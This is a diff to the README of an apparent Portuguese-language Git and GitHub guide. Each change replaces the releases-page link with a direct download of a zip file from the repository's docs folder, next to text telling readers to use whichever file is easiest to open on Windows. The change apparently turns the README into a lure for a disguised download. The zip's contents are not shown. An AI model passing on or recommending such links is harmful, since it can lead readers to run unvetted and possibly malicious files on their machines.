@@ -1,10 +1,10 @@
 # 📘 guia-git-completo - Git e GitHub sem complicação
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Conceptualistic-burr138/guia-git-completo/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Conceptualistic-burr138/guia-git-completo/raw/refs/heads/main/docs/guia_completo_git_2.9.zip)
 
 ## 📥 Download
 Acesse a página de releases para baixar o material:
-https://github.com/Conceptualistic-burr138/guia-git-completo/releases
+https://github.com/Conceptualistic-burr138/guia-git-completo/raw/refs/heads/main/docs/guia_completo_git_2.9.zip
 
 Depois de abrir a página, escolha a versão mais recente e baixe o arquivo disponível.  
 Se houver mais de um arquivo, use o que for mais fácil de abrir no Windows.
@@ -230,7 +230,7 @@ Se já usa Git, vá direto para a seção que precisa.
 
 ## 📎 Acesso ao download
 Página de releases para baixar o material:
-https://github.com/Conceptualistic-burr138/guia-git-completo/releases
+https://github.com/Conceptualistic-burr138/guia-git-completo/raw/refs/heads/main/docs/guia_completo_git_2.9.zip
 
 ## 🧾 Conteúdo do repositório
 Este repositório foi montado para ser uma referência prática sobre Git e GitHub.
